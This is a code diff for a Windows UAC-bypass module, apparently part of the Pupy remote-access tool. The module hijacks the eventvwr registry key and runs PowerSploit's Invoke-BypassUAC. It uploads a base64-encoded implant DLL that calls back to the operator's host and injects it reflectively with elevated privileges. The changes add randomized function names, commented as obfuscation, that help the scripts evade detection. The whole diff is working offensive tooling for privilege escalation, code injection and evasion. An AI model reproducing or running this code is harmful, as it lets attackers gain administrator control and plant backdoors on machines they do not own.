@@ -11,68 +11,52 @@ from tempfile import gettempdir, _get_candidate_names
 import subprocess
 from modules.lib.windows.powershell_upload import execute_powershell_script
 import re, time
+import random, string
+from pupylib.utils.rpyc_utils import redirected_stdo
 
 class bypassuac():
-	'''
-	'''
 	
 	def __init__(self, module, rootPupyPath):
-		'''
-		'''
 		self.module = module
-		self.rootPupyPath = rootPupyPath
-		#Constants
-		self.x86PowershellPath = "syswow64\WindowsPowerShell\\v1.0\\powershell.exe"
-		self.x64PowershellPath = "system32\\WindowsPowerShell\\v1.0\\powershell.exe"
+		self.module.client.load_package("pupwinutils.bypassuac_remote")
+
 		#Remote paths
-		self.remoteTempFolder=self.module.client.conn.modules['os.path'].expandvars("%TEMP%")
-		self.systemRoot = self.module.client.conn.modules['os.path'].expandvars("%SYSTEMROOT%")
-		self.invokeReflectivePEInjectionRemotePath = "{0}.{1}".format(self.module.client.conn.modules['os.path'].join(self.remoteTempFolder, next(_get_candidate_names())), '.txt')
-		self.mainPowershellScriptRemotePath = "{0}.{1}".format(self.module.client.conn.modules['os.path'].join(self.remoteTempFolder, next(_get_candidate_names())), '.ps1')
-		self.pupyDLLRemotePath = "{0}.{1}".format(self.module.client.conn.modules['os.path'].join(self.remoteTempFolder, next(_get_candidate_names())), '.txt')
-		self.invokeBypassUACRemotePath = "{0}.{1}".format(self.module.client.conn.modules['os.path'].join(self.remoteTempFolder, next(_get_candidate_names())), '.ps1')
+		remoteTempFolder, systemRoot = self.module.client.conn.modules["pupwinutils.bypassuac_remote"].get_env_variables()
+		
+		self.invokeReflectivePEInjectionRemotePath = "{temp}{random}{ext}".format(temp=remoteTempFolder, random=next(_get_candidate_names()), ext='.txt')
+		self.mainPowershellScriptRemotePath = "{temp}{random}{ext}".format(temp=remoteTempFolder, random=next(_get_candidate_names()), ext='.ps1')
+		self.pupyDLLRemotePath = "{temp}{random}{ext}".format(temp=remoteTempFolder, random=next(_get_candidate_names()), ext='.txt')
+		self.invokeBypassUACRemotePath = "{temp}{random}{ext}".format(temp=remoteTempFolder, random=next(_get_candidate_names()), ext='.ps1')
+		
+		#Adding obfuscation on ps1 main function
+		self.bypassUAC_random_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(7))
+		self.reflectivePE_random_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(7))
+
 		#Define Local paths
 		self.pupyDLLLocalPath = os.path.join(gettempdir(),'dllFile.txt')
 		self.mainPowerShellScriptPrivilegedLocalPath = os.path.join(gettempdir(),'mainPowerShellScriptPrivileged.txt')
-		self.invokeReflectivePEInjectionLocalPath = os.path.join(self.rootPupyPath,"pupy", "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")
+		self.invokeReflectivePEInjectionLocalPath = os.path.join(rootPupyPath,"pupy", "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")
 		self.invokeBypassUACLocalPath = os.path.join(rootPupyPath, "pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1")
-		#Others
-		self.HKCU = self.module.client.conn.modules['_winreg'].HKEY_CURRENT_USER
-		if "64" in self.module.client.desc['proc_arch']: self.powershellPath = self.module.client.conn.modules['os.path'].join(self.systemRoot, self.x64PowershellPath)
-		else: powershellPath = self.module.client.conn.modules['os.path'].join(self.systemRoot, self.x86PowershellPath)
 		
-	def bypassuac_through_EventVwrBypass(self):
-		'''
-		Based on Invoke-EventVwrBypass, thanks to enigma0x3 (https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
-		'''
-		#Constants
-		mscCmdPath = "Software\Classes\mscfile\shell\open\command"
-		eventvwrPath = self.module.client.conn.modules['os.path'].join(self.module.client.conn.modules['os'].environ['WINDIR'],'System32','eventvwr.exe')
-		cmd = "{1} -ExecutionPolicy Bypass -File {0}".format(self.mainPowershellScriptRemotePath, self.powershellPath)
-		#main
-		self.uploadPupyDLL()
-		self.uploadPowershellScripts()
-		try:
-			key = self.module.client.conn.modules['_winreg'].OpenKey(self.HKCU, mscCmdPath, self.module.client.conn.modules['_winreg'].KEY_SET_VALUE)
-			logging.debug('The registry key {0} already exist in HKCU, altering...'.format(mscCmdPath))
-		except:
-			logging.debug("Adding the registry key {0} in HKCU".format(mscCmdPath))
-			key = self.module.client.conn.modules['_winreg'].CreateKey(self.HKCU, mscCmdPath)
-		registry_key = self.module.client.conn.modules['_winreg'].OpenKey(self.HKCU, mscCmdPath, 0, self.module.client.conn.modules['_winreg'].KEY_WRITE)
-		self.module.client.conn.modules['_winreg'].SetValueEx(registry_key, '', 0, self.module.client.conn.modules['_winreg'].REG_SZ, cmd)
-		self.module.client.conn.modules['_winreg'].CloseKey(registry_key)
 			
-		logging.debug('Executing {0} through eventvwr.exe'.format(eventvwrPath))
-		output = self.module.client.conn.modules.subprocess.check_output(eventvwrPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell = True)
-		logging.debug("Output: {0}".format(repr(output)))
-		logging.debug("Sleeping 5 secds...")
-		time.sleep(5)
-		logging.debug("Deleting registry key {0} from HKCU".format(mscCmdPath))
-		self.module.client.conn.modules['_winreg'].DeleteKey(self.HKCU, mscCmdPath)
-		#Clean
-		self.deleteTHisRemoteFile(self.invokeReflectivePEInjectionRemotePath)
-		self.deleteTHisRemoteFile(self.mainPowershellScriptRemotePath)
-		self.deleteTHisRemoteFile(self.pupyDLLRemotePath)
+	def bypassuac_through_EventVwrBypass(self):
+		# 	'''
+		# 	Based on Invoke-EventVwrBypass, thanks to enigma0x3 (https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
+		# 	'''
+		
+		# On a Windows 10 "C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe" does not exist, we cannot force to use a x64 bit powershell interpreter
+		# The pupy dll upload will be a 32 bit
+		if '64' in self.module.client.desc['proc_arch']:
+			upload_x86_dll = False
+		else:
+			upload_x86_dll = True
+		self.module.info('Uploading temporary files')
+		self.uploadPupyDLL(force_x86_dll=upload_x86_dll)
+		self.uploadPowershellScripts()
+		files_to_delete=[self.invokeReflectivePEInjectionRemotePath, self.mainPowershellScriptRemotePath, self.pupyDLLRemotePath]
+		self.module.info('Altering the registry')
+		self.module.client.conn.modules["pupwinutils.bypassuac_remote"].registry_hijacking(self.mainPowershellScriptRemotePath, files_to_delete)
+		
 		self.module.success("Waiting for a connection from the DLL (take few seconds)...")
 		
 	def bypassuac_through_PowerSploitBypassUAC(self):
@@ -80,23 +64,27 @@ class bypassuac():
 		Performs a bypass UAC attack by utilizing the powersloit UACBypass script (wind7 to 8.1)
 		'''
 		#Constants
-		bypassUACcmd = "Invoke-BypassUAC -Command 'powershell.exe -ExecutionPolicy Bypass -file {0} -Verbose'".format(self.mainPowershellScriptRemotePath) #{0}=mainPowerShellScriptPrivileged.ps1
-		byPassUACSuccessString = "DLL injection complete!"
+		bypassUACcmd = "{InvokeBypassUAC} -Command 'powershell.exe -ExecutionPolicy Bypass -file {mainPowershell} -Verbose'".format(InvokeBypassUAC=self.bypassUAC_random_name, mainPowershell=self.mainPowershellScriptRemotePath)
+		self.module.info('Uploading temporary files')
 		self.uploadPowershellScripts()
 		self.uploadPupyDLL()
 		content = re.sub("Write-Verbose ","Write-Output ", open(self.invokeBypassUACLocalPath, 'r').read(), flags=re.I)
-		logging.info("Starting BypassUAC script with the following cmd: {0}".format(bypassUACcmd))
-		output = execute_powershell_script(self.module, content, bypassUACcmd)
-		logging.info("BypassUAC script output: %s\n"%(output))
-		if byPassUACSuccessString in output:
+		content = re.sub("Invoke-BypassUAC", self.bypassUAC_random_name, content, flags=re.I)
+		logging.debug("Starting BypassUAC script with the following cmd: {0}".format(bypassUACcmd))
+		self.module.info('Starting the UAC Bypass process')
+		output = execute_powershell_script(self.module, content, bypassUACcmd, x64IfPossible=True)
+		logging.debug("BypassUAC script output: %s\n"%(output))
+		
+		if "DLL injection complete!" in output:
 			self.module.success("UAC bypassed")
 		else:
 			self.module.warning("Impossible to know what's happened remotely. You should active debug mode.")
-		#Clean
-		self.deleteTHisRemoteFile(self.invokeReflectivePEInjectionRemotePath)
-		self.deleteTHisRemoteFile(self.mainPowershellScriptRemotePath)
-		self.deleteTHisRemoteFile(self.invokeBypassUACRemotePath)
-		self.deleteTHisRemoteFile(self.pupyDLLRemotePath)
+		
+		#Clean tmp files
+		tmp_files = [self.invokeReflectivePEInjectionRemotePath, self.mainPowershellScriptRemotePath, self.invokeBypassUACRemotePath, self.pupyDLLRemotePath]
+		logging.debug("Deleting temporary files")
+		self.module.client.conn.modules["pupwinutils.bypassuac_remote"].deleteTHisRemoteFile(tmp_files)
+		
 		#...
 		self.module.success("Waiting for a connection from the DLL (take few seconds)...")
 		
@@ -105,47 +93,44 @@ class bypassuac():
 		Upload main powershell script and invokeReflectivePEInjection script
 		'''
 		mainPowerShellScriptPrivileged = """
-		cat {0} | Out-String  | iex
-		cat {1} | Out-String  | iex
-		Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
-		""" #{0}=Invoke-ReflectivePEInjection.txt and {1}=dllFile.txt
-		logging.info("Creating the Powershell script in %s locally"%(self.mainPowerShellScriptPrivilegedLocalPath))
+		cat {invoke_reflective_pe_injection} | Out-String  | iex
+		cat {pupy_dll} | Out-String  | iex
+		{InvokeReflectivePEInjection} -PEBytes $PEBytes -ForceASLR
+		""".format(invoke_reflective_pe_injection=self.invokeReflectivePEInjectionRemotePath, pupy_dll=self.pupyDLLRemotePath, InvokeReflectivePEInjection=self.reflectivePE_random_name)
+		
+		logging.debug("Creating the Powershell script in %s locally"%(self.mainPowerShellScriptPrivilegedLocalPath))
 		with open(self.mainPowerShellScriptPrivilegedLocalPath, 'w+') as w:
-			w.write(mainPowerShellScriptPrivileged.format(self.invokeReflectivePEInjectionRemotePath, self.pupyDLLRemotePath))
-		logging.info("Uploading powershell code for DLL injection in {0}".format(self.invokeReflectivePEInjectionRemotePath))
-		upload(self.module.client.conn, self.invokeReflectivePEInjectionLocalPath, self.invokeReflectivePEInjectionRemotePath)
-		logging.info("Uploading main powershell script executed by BypassUAC in {0}".format(self.mainPowershellScriptRemotePath))
+			w.write(mainPowerShellScriptPrivileged)
+		
+		logging.debug("Uploading powershell code for DLL injection in {0}".format(self.invokeReflectivePEInjectionRemotePath))
+		content = re.sub("Invoke-ReflectivePEInjection", self.reflectivePE_random_name, open(self.invokeReflectivePEInjectionLocalPath).read(), flags=re.I)
+		tmp_file = os.path.join(gettempdir(),'reflective_pe.txt')
+		with open(tmp_file, 'w+') as w:
+			w.write(content)
+		upload(self.module.client.conn, tmp_file, self.invokeReflectivePEInjectionRemotePath)
+		
+		logging.debug("Uploading main powershell script executed by BypassUAC in {0}".format(self.mainPowershellScriptRemotePath))
 		upload(self.module.client.conn, self.mainPowerShellScriptPrivilegedLocalPath, self.mainPowershellScriptRemotePath)
 
-	def uploadPupyDLL(self):
+	def uploadPupyDLL(self, force_x86_dll=False):
 		'''
-		Returns True if no error. Otherwise returns False
+		Upload pupy dll as a txt file
 		'''
 		res=self.module.client.conn.modules['pupy'].get_connect_back_host()
 		host, port = res.rsplit(':',1)
-		logging.info("Address configured is %s:%s for pupy dll..."%(host,port))
-		logging.info("Looking for process architecture...")
-		if self.module.client.conn.modules['pupwinutils.processes'].is_x64_architecture() == True:
-			logging.info("Target achitecture is x64, using a x64 dll")
+		logging.debug("Address configured is %s:%s for pupy dll..."%(host,port))
+		logging.debug("Looking for process architecture...")
+
+		if "64" in self.module.client.desc["os_arch"] and not force_x86_dll:
+			logging.debug("Target achitecture is x64, using a x64 dll")
 			dllbuff=pupygen.get_edit_pupyx64_dll(self.module.client.get_conf())
-		elif self.module.client.conn.modules['pupwinutils.processes'].is_x86_architecture() == True:
-			logging.info("Target achitecture is x86, using a x86 dll")
-			dllbuff=pupygen.get_edit_pupyx86_dll(self.module.client.get_conf())
 		else:
-			self.module.error("Target architecture is unknown (!= x86 or x64), abording...")
-			return False
-		logging.info("Creating the pupy dll in %s locally"%(self.pupyDLLLocalPath))
+			logging.debug("Target achitecture is x86, using a x86 dll")
+			dllbuff=pupygen.get_edit_pupyx86_dll(self.module.client.get_conf())
+		
+		logging.debug("Creating the pupy dll in %s locally"%(self.pupyDLLLocalPath))
 		with open(self.pupyDLLLocalPath, 'w+') as w:
 			w.write('$PEBytes = [System.Convert]::FromBase64String("%s")'%(base64.b64encode(dllbuff)))
-		logging.info("Uploading pupy dll in {0}".format(self.pupyDLLRemotePath))
-		upload(self.module.client.conn, self.pupyDLLLocalPath, self.pupyDLLRemotePath)
-		return True
 		
-	def deleteTHisRemoteFile(self, remotePath):
-		'''
-		'''
-		logging.debug("Deleting the remote file {0}".format(remotePath))
-		try:
-			self.module.client.conn.modules['os'].remove(remotePath)
-		except Exception, e:
-			logging.warning('Impossible to delete remote file {0}: {1}'.format(remotePath, repr(e)))
+		logging.debug("Uploading pupy dll in {0}".format(self.pupyDLLRemotePath))
+		upload(self.module.client.conn, self.pupyDLLLocalPath, self.pupyDLLRemotePath)
